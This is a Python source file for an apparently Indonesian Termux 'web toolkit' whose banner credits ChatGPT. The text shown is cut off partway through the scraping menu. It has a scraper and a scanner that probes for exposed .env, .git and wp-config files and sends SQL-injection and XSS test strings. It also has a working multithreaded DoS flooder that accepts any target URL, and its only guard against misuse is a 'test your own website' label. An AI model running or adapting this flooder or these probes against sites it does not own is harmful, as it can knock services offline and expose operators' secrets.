import os
import re
import sys
import time
import json
import queue
import shutil
import signal
import random
import string
import threading
import subprocess
import socket
import dns.resolver
import ssl
from urllib.parse import urljoin, urlparse, urlunparse
import requests
from bs4 import BeautifulSoup
from tqdm import tqdm
from colorama import init as colorama_init, Fore, Back, Style

# Inisialisasi colorama dengan konversi ANSI untuk Windows
colorama_init(autoreset=True, convert=True, strip=True)

# Fungsi untuk membersihkan output dari kode ANSI
def clean_ansi(text):
    ansi_escape = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
    return ansi_escape.sub('', text)

# ====== Warna & Emoji ======
C = {
    "R": Fore.RED,
    "G": Fore.GREEN,
    "Y": Fore.YELLOW,
    "B": Fore.BLUE,
    "M": Fore.MAGENTA,
    "C": Fore.CYAN,
    "W": Fore.WHITE,
    "GR": Fore.BLACK,
    "RESET": Style.RESET_ALL,
    "BOLD": Style.BRIGHT,
}
EMO = {
    "spark": "✨",
    "boom": "💥",
    "rocket": "🚀",
    "ok": "✅",
    "warn": "⚠️",
    "info": "ℹ️",
    "disk": "💾",
    "down": "⬇️",
    "net": "🌐",
    "scan": "🧪",
    "shield": "🛡️",
    "search": "🔎",
    "gear": "⚙️",
    "folder": "📁",
    "exit": "🚪",
    "spider": "🕷️",
    "dos": "💣",
    "check": "✓",
    "cross": "✗",
}
UA = (
    "Mozilla/5.0 (Linux; Android 13; Termux) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Mobile Safari/537.36"
)
SESSION = requests.Session()
SESSION.headers.update({"User-Agent": UA})
REQUEST_TIMEOUT = 20
STOP_EVENT = threading.Event()
DOS_STOP_EVENT = threading.Event()

# ====== Util: Animasi ======
def type_print(text, delay=0.01):
    # Bersihkan kode ANSI sebelum mencetak
    clean_text = clean_ansi(text)
    for ch in clean_text:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def spinner(text="Processing"):
    frames = ["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]
    i = 0
    while not STOP_EVENT.is_set():
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(f"{C['C']}{text} {frames[i%len(frames)]}{C['RESET']}")
        sys.stdout.write(f"\r{clean_text}")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(text) + 4) + "\r")

def banner():
    # Ganti 'clear' dengan 'cls' untuk Windows
    os.system("cls" if os.name == 'nt' else "clear")
    title = f"{C['BOLD']}{C['M']}WEBTEST{C['RESET']}"
    sub = f"{C['GR']}Termux Web Toolkit · Scraping + SQLi + DoS + Scanner · by ChatGPT{C['RESET']}"
    art = f"""
{C['Y']}{EMO['spark']} {title} {EMO['spark']}{C['RESET']}
{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
{EMO['spider']}  Scraping: HTML · CSS · JS · Assets · Meta · Full
{EMO['shield']}  SQL Injection (sqlmap): Basic · Dump DBs · Crawl · Risk3 · Tor
{EMO['dos']}  DoS Attack: Customizable for testing your own website
{EMO['scan']}  Website Scanner: Security · Headers · Files · Vulnerabilities
{EMO['info']}  After actions, shows your Public IP
{C['GR']}────────────────────────────────────────────────────────{C['RESET']}
"""
    # Bersihkan kode ANSI sebelum mencetak
    clean_art = clean_ansi(art)
    print(clean_art)

def input_colored(prompt):
    # Bersihkan kode ANSI sebelum mencetak
    clean_prompt = clean_ansi(f"{C['BOLD']}{C['G']}{prompt}{C['RESET']}")
    return input(clean_prompt)

def sanitize_folder(name: str):
    name = re.sub(r"[^a-zA-Z0-9._-]", "_", name)
    return name[:60]

def ensure_dir(path: str):
    os.makedirs(path, exist_ok=True)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def get_public_ip():
    urls = [
        "https://api.ipify.org",
        "https://ifconfig.me/ip",
        "https://ipinfo.io/ip",
    ]
    for u in urls:
        try:
            r = SESSION.get(u, timeout=10)
            if r.ok:
                ip = r.text.strip()
                if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip) or ":" in ip:
                    return ip
        except requests.RequestException:
            pass
    return "Unknown"

# ====== Scraping ======
def fetch_html(url: str):
    r = SESSION.get(url, timeout=REQUEST_TIMEOUT)
    r.raise_for_status()
    return r.text

def extract_assets(base_url: str, html: str):
    soup = BeautifulSoup(html, "html.parser")
    assets = {
        "css": set(),
        "js": set(),
        "img": set(),
        "icons": set(),
        "meta": [],
    }
    # CSS
    for link in soup.find_all("link", href=True):
        rel = " ".join(link.get("rel", [])).lower()
        href = urljoin(base_url, link["href"])
        if "stylesheet" in rel or href.lower().endswith(".css"):
            assets["css"].add(href)
        if "icon" in rel or any(href.lower().endswith(ext) for ext in [".ico", ".png", ".svg"]):
            assets["icons"].add(href)
    # JS
    for sc in soup.find_all("script", src=True):
        src = urljoin(base_url, sc["src"])
        assets["js"].add(src)
    # IMG
    for im in soup.find_all(["img","source"], src=True):
        src = urljoin(base_url, im["src"])
        assets["img"].add(src)
    for im in soup.find_all("img", srcset=True):
        # pick first candidate
        cand = im["srcset"].split(",")[0].strip().split(" ")[0]
        if cand:
            assets["img"].add(urljoin(base_url, cand))
    # META
    for m in soup.find_all("meta"):
        assets["meta"].append({k: m.get(k) for k in m.attrs})
    return assets

def write_text(path, content):
    with open(path, "w", encoding="utf-8", errors="ignore") as f:
        f.write(content)

def download_file(url, dest_path):
    try:
        with SESSION.get(url, stream=True, timeout=REQUEST_TIMEOUT) as r:
            r.raise_for_status()
            total = int(r.headers.get("Content-Length", 0))
            tmp = dest_path + ".part"
            with open(tmp, "wb") as f, tqdm(
                total=total if total > 0 else None,
                unit="B",
                unit_scale=True,
                dynamic_ncols=True,
                leave=False
            ) as pbar:
                for chunk in r.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)
                        if total:
                            pbar.update(len(chunk))
            os.replace(tmp, dest_path)
        return True, ""
    except Exception as e:
        return False, str(e)

def choose_dir_for(url):
    netloc = urlparse(url).netloc or "site"
    base = sanitize_folder(f"{netloc}_{timestamp()}")
    outdir = os.path.join(os.getcwd(), "WEBTEST_RESULTS", base)
    ensure_dir(outdir)
    return outdir

# ====== Website Scanner ======
class WebsiteScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": UA})
        
    def typewriter_effect(self, text, delay=0.01):
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(text)
        for ch in clean_text:
            sys.stdout.write(ch)
            sys.stdout.flush()
            time.sleep(delay)
        print()
        
    def loading_animation(self, text):
        # Bersihkan kode ANSI sebelum mencetak
        clean_text = clean_ansi(f"\n{C['C']}⏳ {text}...{C['RESET']}")
        self.typewriter_effect(clean_text)
        
    def get_web_info(self, url):
        """Get comprehensive information about a website"""
        self.typewriter_effect(f"🌐 Gathering website information for: {url}")
        
        try:
            # Parse URL and validate
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
                
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            
            # Create result dictionary
            info = {
                'url': url,
                'domain': domain,
                'is_secure': parsed_url.scheme == 'https',
                'ip_address': '',
                'server_info': {},
                'technologies': [],
                'status': 'Unknown',
                'dns_records': {},
                'headers': {},
                'security_headers': {}
            }
            
            # Get IP address
            self.loading_animation("Resolving IP address")
            try:
                ip = socket.gethostbyname(domain)
                info['ip_address'] = ip
            except:
                info['ip_address'] = "Could not resolve"
            
            # Check if site is online
            self.loading_animation("Checking site availability")
            try:
                response = self.session.head(url, timeout=10)
                info['status'] = f"Online (HTTP {response.status_code})"
            except:
                info['status'] = "Offline or unreachable"
                self.typewriter_effect("\n❌ Website appears to be offline")
                return info
            
            # Get server headers
            self.loading_animation("Analyzing server headers")
            response = self.session.get(url, timeout=10)
            info['headers'] = dict(response.headers)
            
            # Extract server info from headers
            server_headers = ['Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version']
            for header in server_headers:
                if header in response.headers:
                    info['server_info'][header] = response.headers[header]
            
            # Check common security headers
            security_headers = [
                'Strict-Transport-Security',
                'Content-Security-Policy',
                'X-Content-Type-Options',
                'X-Frame-Options',
                'X-XSS-Protection',
                'Referrer-Policy',
                'Feature-Policy',
                'Permissions-Policy'
            ]
            
            for header in security_headers:
                if header in response.headers:
                    info['security_headers'][header] = response.headers[header]
            
            # Get DNS records
            self.loading_animation("Checking DNS records")
            try:
                dns_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
                resolver = dns.resolver.Resolver()
                
                for record_type in dns_types:
                    try:
                        answers = resolver.resolve(domain, record_type)
                        info['dns_records'][record_type] = [str(r) for r in answers]
                    except:
                        continue
            except:
                info['dns_records'] = "DNS lookup failed"
            
            # Detect technologies (basic detection)
            self.loading_animation("Detecting technologies")
            tech_detected = set()
            
            # From headers
            if 'Server' in response.headers:
                server = response.headers['Server']
                tech_detected.add(server.split('/')[0])  # e.g. "nginx/1.2" -> "nginx"
            
            if 'X-Powered-By' in response.headers:
                powered_by = response.headers['X-Powered-By']
                tech_detected.update(x.strip() for x in powered_by.split(','))
            
            # From HTML content
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Detect WordPress
            if 'wp-content' in response.text or 'wp-includes' in response.text:
                tech_detected.add('WordPress')
            
            # Detect jQuery
            scripts = soup.find_all('script', src=True)
            for script in scripts:
                src = script['src'].lower()
                if 'jquery' in src:
                    tech_detected.add('jQuery')
                if 'bootstrap' in src:
                    tech_detected.add('Bootstrap')
                if 'react' in src:
                    tech_detected.add('React')
                if 'vue' in src:
                    tech_detected.add('Vue.js')
            
            # Detect PHP
            if '.php' in response.text or 'PHPSESSID' in response.text:
                tech_detected.add('PHP')
            
            info['technologies'] = sorted(tech_detected)
            
            return info
            
        except Exception as e:
            self.typewriter_effect(f"❌ Website info gathering failed: {str(e)}")
            return None
    
    def display_web_info(self, info):
        """Display the website information in a formatted way"""
        if not info:
            self.typewriter_effect("❌ No website information to display")
            return
        
        self.typewriter_effect("\n🌐 WEBSITE INFORMATION REPORT:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        # Basic Info
        self.typewriter_effect(f"\n🔍 Basic Information:")
        self.typewriter_effect(f"   URL: {info['url']}")
        self.typewriter_effect(f"   Domain: {info['domain']}")
        self.typewriter_effect(f"   IP Address: {info['ip_address']}")
        self.typewriter_effect(f"   Secure (HTTPS): {'✅ Yes' if info['is_secure'] else '❌ No'}")
        self.typewriter_effect(f"   Status: {info['status']}")
        
        # Server Info
        if info['server_info']:
            self.typewriter_effect("\n🖥️ Server Information:")
            for key, value in info['server_info'].items():
                self.typewriter_effect(f"   {key}: {value}")
        else:
            self.typewriter_effect("\n⚠️ No server information found in headers")
        
        # Technologies
        if info['technologies']:
            self.typewriter_effect("\n⚙️ Detected Technologies:")
            for tech in info['technologies']:
                self.typewriter_effect(f"   - {tech}")
        else:
            self.typewriter_effect("\n⚠️ No technologies detected")
        
        # DNS Records
        if info['dns_records'] and isinstance(info['dns_records'], dict):
            self.typewriter_effect("\n📡 DNS Records:")
            for record_type, values in info['dns_records'].items():
                self.typewriter_effect(f"   {record_type}:")
                for value in values:
                    self.typewriter_effect(f"      {value}")
        else:
            self.typewriter_effect("\n⚠️ No DNS records retrieved")
        
        # Security Headers
        if info['security_headers']:
            self.typewriter_effect("\n🔒 Security Headers:")
            for header, value in info['security_headers'].items():
                self.typewriter_effect(f"   {header}: {value}")
            
            # Security rating
            important_headers = ['Strict-Transport-Security', 'Content-Security-Policy', 
                               'X-Content-Type-Options', 'X-Frame-Options']
            missing = [h for h in important_headers if h not in info['security_headers']]
            
            if not missing:
                self.typewriter_effect("\n✅ Excellent security headers configuration")
            elif len(missing) <= 2:
                self.typewriter_effect(f"\n⚠️ Missing some important security headers: {', '.join(missing)}")
            else:
                self.typewriter_effect(f"\n❌ Poor security headers - missing: {', '.join(missing)}")
        else:
            self.typewriter_effect("\n⚠️ No security headers found")
        
        self.typewriter_effect("\n✅ Website information gathering complete")
    
    def scan_website(self, url):
        """Perform comprehensive security scan on a website"""
        self.typewriter_effect(f"\n🔍 Starting security scan for: {url}")
        
        # Get basic website info first
        info = self.get_web_info(url)
        if not info:
            return None
            
        # Create scan results dictionary
        scan_results = {
            'url': url,
            'domain': info['domain'],
            'ip_address': info['ip_address'],
            'security_score': 0,
            'vulnerabilities': [],
            'security_issues': [],
            'recommendations': [],
            'open_ports': [],
            'ssl_info': {},
            'directory_listing': [],
            'exposed_files': [],
            'common_vulnerabilities': []
        }
        
        # Check SSL/TLS if HTTPS
        if info['is_secure']:
            self.loading_animation("Analyzing SSL/TLS configuration")
            try:
                hostname = info['domain']
                context = ssl.create_default_context()
                with socket.create_connection((hostname, 443), timeout=10) as sock:
                    with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                        cert = ssock.getpeercert()
                        cipher = ssock.cipher()
                        version = ssock.version()
                        
                        scan_results['ssl_info'] = {
                            'certificate': {
                                'subject': dict(x[0] for x in cert['subject']),
                                'issuer': dict(x[0] for x in cert['issuer']),
                                'version': cert['version'],
                                'serial_number': cert['serialNumber'],
                                'not_before': cert['notBefore'],
                                'not_after': cert['notAfter'],
                            },
                            'connection': {
                                'protocol': version,
                                'cipher': cipher[0],
                                'bits': cipher[2],
                            }
                        }
                        
                        # Check certificate expiration
                        from datetime import datetime
                        not_after = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
                        days_left = (not_after - datetime.now()).days
                        
                        if days_left < 0:
                            scan_results['security_issues'].append("SSL certificate has expired")
                            scan_results['vulnerabilities'].append({
                                'type': 'SSL Certificate Expired',
                                'severity': 'High',
                                'description': 'The SSL certificate has expired'
                            })
                        elif days_left < 30:
                            scan_results['security_issues'].append(f"SSL certificate expires in {days_left} days")
                            scan_results['vulnerabilities'].append({
                                'type': 'SSL Certificate Expiring Soon',
                                'severity': 'Medium',
                                'description': f'The SSL certificate expires in {days_left} days'
                            })
                        
                        # Check protocol version
                        if version in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                            scan_results['security_issues'].append(f"Using outdated protocol: {version}")
                            scan_results['vulnerabilities'].append({
                                'type': 'Outdated TLS Protocol',
                                'severity': 'High',
                                'description': f'Using outdated TLS protocol: {version}'
                            })
                        
                        # Check cipher strength
                        if cipher[2] < 128:
                            scan_results['security_issues'].append(f"Weak cipher: {cipher[0]} ({cipher[2]} bits)")
                            scan_results['vulnerabilities'].append({
                                'type': 'Weak Cipher',
                                'severity': 'Medium',
                                'description': f'Using weak cipher: {cipher[0]} ({cipher[2]} bits)'
                            })
            except Exception as e:
                scan_results['security_issues'].append(f"SSL/TLS analysis failed: {str(e)}")
        
        # Check for common directories and files
        self.loading_animation("Checking for exposed directories and files")
        common_paths = [
            '/.env', '/.git', '/.svn', '/.htaccess', '/.htpasswd',
            '/backup', '/backups', '/admin', '/administrator', '/login',
            '/wp-admin', '/wp-config.php', '/config.php', '/phpinfo.php',
            '/test.php', '/info.php', '/robots.txt', '/sitemap.xml',
            '/crossdomain.xml', '/clientaccesspolicy.xml'
        ]
        
        for path in common_paths:
            try:
                test_url = urljoin(url, path)
                response = self.session.head(test_url, timeout=5)
                
                if response.status_code == 200:
                    if path.endswith('/'):
                        scan_results['directory_listing'].append(test_url)
                    else:
                        scan_results['exposed_files'].append(test_url)
                        
                    scan_results['security_issues'].append(f"Exposed path: {path}")
                    scan_results['vulnerabilities'].append({
                        'type': 'Exposed Path',
                        'severity': 'Medium',
                        'description': f'Potentially sensitive file or directory exposed: {path}'
                    })
            except:
                continue
        
        # Check for common vulnerabilities
        self.loading_animation("Checking for common vulnerabilities")
        
        # Check for Clickjacking protection
        if 'X-Frame-Options' not in info['headers'] and 'Content-Security-Policy' not in info['headers']:
            scan_results['security_issues'].append("Missing Clickjacking protection")
            scan_results['vulnerabilities'].append({
                'type': 'Missing Clickjacking Protection',
                'severity': 'Medium',
                'description': 'Missing X-Frame-Options or Content-Security-Policy headers'
            })
        
        # Check for XSS protection
        if 'X-XSS-Protection' not in info['headers']:
            scan_results['security_issues'].append("Missing XSS protection header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing XSS Protection',
                'severity': 'Medium',
                'description': 'Missing X-XSS-Protection header'
            })
        
        # Check for MIME type sniffing
        if 'X-Content-Type-Options' not in info['headers']:
            scan_results['security_issues'].append("Missing X-Content-Type-Options header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing MIME Type Sniffing Protection',
                'severity': 'Low',
                'description': 'Missing X-Content-Type-Options header'
            })
        
        # Check for HSTS
        if info['is_secure'] and 'Strict-Transport-Security' not in info['headers']:
            scan_results['security_issues'].append("Missing HSTS header")
            scan_results['vulnerabilities'].append({
                'type': 'Missing HSTS',
                'severity': 'Medium',
                'description': 'Missing Strict-Transport-Security header for HTTPS site'
            })
        
        # Check for server version disclosure
        if 'Server' in info['headers']:
            server = info['headers']['Server']
            if any(char.isdigit() for char in server):
                scan_results['security_issues'].append("Server version disclosed")
                scan_results['vulnerabilities'].append({
                    'type': 'Server Version Disclosure',
                    'severity': 'Low',
                    'description': f'Server header reveals version: {server}'
                })
        
        # Check for PHP version disclosure
        if 'X-Powered-By' in info['headers']:
            powered_by = info['headers']['X-Powered-By']
            if 'PHP' in powered_by and any(char.isdigit() for char in powered_by):
                scan_results['security_issues'].append("PHP version disclosed")
                scan_results['vulnerabilities'].append({
                    'type': 'PHP Version Disclosure',
                    'severity': 'Low',
                    'description': f'X-Powered-By header reveals PHP version: {powered_by}'
                })
        
        # Check for common web vulnerabilities
        self.loading_animation("Testing for common web vulnerabilities")
        
        # Test for SQL Injection (basic test)
        try:
            test_url = urljoin(url, "?id=1' OR '1'='1")
            response = self.session.get(test_url, timeout=5)
            
            # Check for common SQL error messages
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-", "Microsoft OLE DB Provider",
                "SQLServer", "PostgreSQL query failed", "SQLite error"
            ]
            
            for error in sql_errors:
                if error in response.text:
                    scan_results['security_issues'].append("Potential SQL Injection vulnerability")
                    scan_results['vulnerabilities'].append({
                        'type': 'SQL Injection',
                        'severity': 'High',
                        'description': f'Potential SQL Injection vulnerability detected: {error}'
                    })
                    break
        except:
            pass
        
        # Test for XSS (basic test)
        try:
            test_url = urljoin(url, "?q=<script>alert('XSS')</script>")
            response = self.session.get(test_url, timeout=5)
            
            if "<script>alert('XSS')</script>" in response.text:
                scan_results['security_issues'].append("Potential XSS vulnerability")
                scan_results['vulnerabilities'].append({
                    'type': 'Cross-Site Scripting (XSS)',
                    'severity': 'High',
                    'description': 'Potential XSS vulnerability detected'
                })
        except:
            pass
        
        # Calculate security score
        max_score = 100
        deductions = 0
        
        for vuln in scan_results['vulnerabilities']:
            if vuln['severity'] == 'High':
                deductions += 15
            elif vuln['severity'] == 'Medium':
                deductions += 8
            elif vuln['severity'] == 'Low':
                deductions += 3
        
        scan_results['security_score'] = max(0, max_score - deductions)
        
        # Generate recommendations
        if scan_results['security_score'] < 70:
            scan_results['recommendations'].append("Implement all missing security headers")
            scan_results['recommendations'].append("Regularly update server software and frameworks")
            scan_results['recommendations'].append("Perform regular security audits")
        
        if any(v['type'] == 'Exposed Path' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Restrict access to sensitive files and directories")
            scan_results['recommendations'].append("Implement proper access controls")
        
        if any(v['type'] == 'SQL Injection' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Use parameterized queries or prepared statements")
            scan_results['recommendations'].append("Implement input validation and sanitization")
        
        if any(v['type'] == 'Cross-Site Scripting (XSS)' for v in scan_results['vulnerabilities']):
            scan_results['recommendations'].append("Implement Content Security Policy (CSP)")
            scan_results['recommendations'].append("Sanitize user input and encode output")
        
        if info['is_secure'] and scan_results['ssl_info']:
            if scan_results['ssl_info']['connection']['protocol'] in ['SSLv2', 'SSLv3', 'TLSv1', 'TLSv1.1']:
                scan_results['recommendations'].append("Upgrade to TLS 1.2 or higher")
            
            if scan_results['ssl_info']['connection']['bits'] < 128:
                scan_results['recommendations'].append("Use stronger cipher suites")
        
        return scan_results
    
    def display_scan_results(self, scan_results):
        """Display the scan results in a formatted way"""
        if not scan_results:
            self.typewriter_effect("❌ No scan results to display")
            return
        
        self.typewriter_effect("\n🔍 WEBSITE SECURITY SCAN RESULTS:")
        self.typewriter_effect("══════════════════════════════════════════════")
        
        # Basic Info
        self.typewriter_effect(f"\n🌐 Target: {scan_results['url']}")
        self.typewriter_effect(f"🖥️ Domain: {scan_results['domain']}")
        self.typewriter_effect(f"📡 IP Address: {scan_results['ip_address']}")
        
        # Security Score
        score = scan_results['security_score']
        if score >= 90:
            score_color = C['G']
            score_text = "Excellent"
        elif score >= 70:
            score_color = C['Y']
            score_text = "Good"
        elif score >= 50:
            score_color = C['Y']
            score_text = "Fair"
        else:
            score_color = C['R']
            score_text = "Poor"
            
        self.typewriter_effect(f"\n🛡️ Security Score: {score_color}{score}/100 ({score_text}){C['RESET']}")
        
        # SSL/TLS Info
        if scan_results['ssl_info']:
            self.typewriter_effect("\n🔒 SSL/TLS Information:")
            ssl_info = scan_results['ssl_info']
            
            # Certificate info
            cert = ssl_info['certificate']
            self.typewriter_effect(f"   Certificate Subject: {cert['subject'].get('commonName', 'N/A')}")
            self.typewriter_effect(f"   Certificate Issuer: {cert['issuer'].get('commonName', 'N/A')}")
            self.typewriter_effect(f"   Certificate Valid Until: {cert['not_after']}")
            
            # Connection info
            conn = ssl_info['connection']
            self.typewriter_effect(f"   Protocol: {conn['protocol']}")
            self.typewriter_effect(f"   Cipher: {conn['cipher']} ({conn['bits']} bits)")
        
        # Vulnerabilities
        if scan_results['vulnerabilities']:
            self.typewriter_effect(f"\n{C['R']}🚨 Vulnerabilities Found:{C['RESET']}")
            for vuln in scan_results['vulnerabilities']:
                if vuln['severity'] == 'High':
                    severity_color = C['R']
                elif vuln['severity'] == 'Medium':
                    severity_color = C['Y']
                else:
                    severity_color = C['W']
                    
                self.typewriter_effect(f"   {severity_color}[{vuln['severity']}] {vuln['type']}{C['RESET']}")
                self.typewriter_effect(f"      {vuln['description']}")
        else:
            self.typewriter_effect(f"\n{C['G']}✅ No vulnerabilities detected{C['RESET']}")
        
        # Security Issues
        if scan_results['security_issues']:
            self.typewriter_effect(f"\n{C['Y']}⚠️ Security Issues:{C['RESET']}")
            for issue in scan_results['security_issues']:
                self.typewriter_effect(f"   • {issue}")
        
        # Exposed Files and Directories
        if scan_results['exposed_files']:
            self.typewriter_effect(f"\n{C['R']}📁 Exposed Files:{C['RESET']}")
            for file in scan_results['exposed_files']:
                self.typewriter_effect(f"   • {file}")
        
        if scan_results['directory_listing']:
            self.typewriter_effect(f"\n{C['R']}📂 Directory Listing Enabled:{C['RESET']}")
            for dir in scan_results['directory_listing']:
                self.typewriter_effect(f"   • {dir}")
        
        # Recommendations
        if scan_results['recommendations']:
            self.typewriter_effect(f"\n{C['B']}💡 Recommendations:{C['RESET']}")
            for rec in scan_results['recommendations']:
                self.typewriter_effect(f"   • {rec}")
        
        self.typewriter_effect("\n✅ Website security scan complete")

# ====== DoS Attack ======
def dos_attack():
    type_print(f"{C['R']}{EMO['dos']} Customizable DoS Attack (for testing your own website){C['RESET']}")
    target_url = input_colored(f"{EMO['dos']} Masukkan URL target (http/https):")
    
    if not re.match(r"^https?://", target_url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    # Input validation
    while True:
        try:
            requests_count = input_colored("Jumlah requests (Default 1000 Max 10000):").strip()
            if not requests_count:
                requests_count = 1000
            else:
                requests_count = int(requests_count)
                if requests_count > 10000:
                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 10000, menggunakan 10000{C['RESET']}")
                    requests_count = 10000
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    while True:
        try:
            thread_count = input_colored("Jumlah threads (Default 10 Max 100):").strip()
            if not thread_count:
                thread_count = 10
            else:
                thread_count = int(thread_count)
                if thread_count > 100:
                    type_print(f"{C['Y']}{EMO['warn']} Maksimum 100, menggunakan 100{C['RESET']}")
                    thread_count = 100
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    while True:
        try:
            delay = input_colored("Delay antar requests dalam detik (Default 0.1):").strip()
            if not delay:
                delay = 0.1
            else:
                delay = float(delay)
            break
        except ValueError:
            type_print(f"{C['R']}❌ Masukkan angka yang valid{C['RESET']}")
    # Confirmation
    type_print(f"\n{C['BOLD']}{EMO['dos']} Konfigurasi Attack:{C['RESET']}")
    type_print(f"   Target: {target_url}")
    type_print(f"   Total Requests: {requests_count}")
    type_print(f"   Threads: {thread_count}")
    type_print(f"   Delay: {delay} detik")
    
    confirm = input_colored("\nYakin ingin meluncurkan attack? (yes/no):").lower()
    if confirm != 'yes':
        type_print(f"{C['Y']}{EMO['warn']} Attack dibatalkan{C['RESET']}")
        return
    
    # Attack statistics
    successful_requests = 0
    failed_requests = 0
    start_time = time.time()
    DOS_STOP_EVENT.clear()
    
    # Worker function
    def attack_worker(url, req_count, delay_time):
        nonlocal successful_requests, failed_requests
        thread_session = requests.Session()
        thread_session.headers.update({"User-Agent": UA})
        for _ in range(req_count):
            if DOS_STOP_EVENT.is_set():
                break
            try:
                response = thread_session.get(url, timeout=5)
                if response.status_code == 200:
                    successful_requests += 1
                else:
                    failed_requests += 1
            except:
                failed_requests += 1
            time.sleep(delay_time)
    
    # Calculate requests per thread
    requests_per_thread = requests_count // thread_count
    remaining_requests = requests_count % thread_count
    
    # Start threads
    type_print(f"\n{C['R']}{EMO['dos']} Meluncurkan DoS attack... Tekan Ctrl+C untuk menghentikan{C['RESET']}")
    threads = []
    
    for i in range(thread_count):
        # Distribute remaining requests to first few threads
        req_count = requests_per_thread + (1 if i < remaining_requests else 0)
        if req_count > 0:
            t = threading.Thread(target=attack_worker, args=(target_url, req_count, delay))
            t.daemon = True
            t.start()
            threads.append(t)
    
    # Progress monitoring
    try:
        while any(t.is_alive() for t in threads):
            elapsed = time.time() - start_time
            reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
            
            # Bersihkan kode ANSI sebelum mencetak
            clean_text = clean_ansi(f"\r{C['R']}⚡ Status: {successful_requests + failed_requests}/{requests_count} requests | "
                           f"Success: {successful_requests}✅| "
                           f"Failed: {failed_requests} | "
                           f"Rate: {reqs_per_sec:.1f} reqs/sec{C['RESET']}")
            sys.stdout.write(clean_text)
            sys.stdout.flush()
            time.sleep(0.5)
    except KeyboardInterrupt:
        DOS_STOP_EVENT.set()
        type_print(f"\n{C['Y']}{EMO['warn']} Attack dihentikan oleh pengguna{C['RESET']}")
    
    # Final statistics
    elapsed = time.time() - start_time
    reqs_per_sec = (successful_requests + failed_requests) / elapsed if elapsed > 0 else 0
    
    type_print(f"\n\n{C['BOLD']}{EMO['dos']} Hasil Attack:{C['RESET']}")
    type_print(f"   Total Requests: {successful_requests + failed_requests}")
    type_print(f"   Successful: {successful_requests}")
    type_print(f"   Failed: {failed_requests}")
    type_print(f"   Duration: {elapsed:.2f} detik")
    type_print(f"   Request Rate: {reqs_per_sec:.1f} requests/detik")
    
    # Tampilkan IP publik setelah attack
    ip = get_public_ip()
    type_print(f"{C['BOLD']}{EMO['net']} IP Publik kamu: {C['Y']}{ip}{C['RESET']}")

def scrape_flow():
    url = input_colored(f"{EMO['net']} Masukkan URL target (https://...):")
    if not re.match(r"^https?://", url):
        type_print(f"{C['R']}{EMO['warn']} URL harus diawali http/https{C['RESET']}")
        return
    outdir = choose_dir_for(url)
    ensure_dir(outdir)
    ensure_dir(os.path.join(outdir, "assets", "css"))
    ensure_dir(os.path.join(outdir, "assets", "js"))
    ensure_dir(os.path.join(outdir, "assets", "img"))
    ensure_dir(os.path.join(outdir, "assets", "icons"))
    type_print(f"{C['C']}{EMO['search']} Mengambil HTML...{C['RESET']}", 0.005)
    STOP_EVENT.clear()
    t = threading.Thread(target=spinner, args=("Fetching",), daemon=True)
    t.start()
    try:
        html = fetch_html(url)
    except Exception as e:
        STOP_EVENT.set()
        t.join()
        type_print(f"{C['R']}Gagal mengambil halaman: {e}{C['RESET']}")
        return
    STOP_EVENT.set()
    t.join()
    type_print(f"{C['G']}{EMO['ok']} HTML didapat ({len(html):,} chars){C['RESET']}")
    write_text(os.path.join(outdir, "index.html"), html)
    type_print(f"{EMO['disk']} Disimpan: {C['Y']}{outdir}/index.html{C['RESET']}")
    assets = extract_assets(url, html)
    # Simpan meta ke file
    write_text(os.path.join(outdir, "meta.json"), json.dumps(assets["meta"], indent=2, ensure_ascii=False))
    while True:
        print(f"""
{C['BOLD']}{EMO['gear']} Menu Scraping — {C['Y']}WEBTEST{C['RESET']}
{C['GR']}Folder: {outdir}{C['RESET']}
  1) {EMO['down']} Download HTML
  2) {EMO['down']} Download CSS ({len(assets['css'])})
  3) {EMO['down']} Download JS ({len(assets['js'])})
  4) {EMO['down']} Download Assets (img/icons) ({len(assets['img']) + len(assets['icons'])})
  5) {EMO['down']} Download Meta Tags (jika ada)
  6) {EMO['down']} Download Full (HTML+CSS+JS+Assets+Meta)
  ketik 'exit' untuk keluar menu ini
""")
        choice = input_colored("Pilih opsi:")
        if choice.lower() == "exit":
            type_print(f"{C['M']}{EMO['exit']} Keluar dari menu scraping{C['RESET']}")
            break
        if choice == "1":
            # sudah tersimpan sebagai index.html
            type_print(f"{C['G']}{EMO['ok']} HTML sudah disimpan sebagai index.html{C['RESET']}")
        elif choice == "2":
            total = len(assets["css"])
            if not total:
                type_print(f"{C['Y']}{EMO['info']} Tidak ada CSS terdeteksi.{C['RESET']}")
                continue
            type_print(f"{EMO['down']} Download CSS ({total})...")
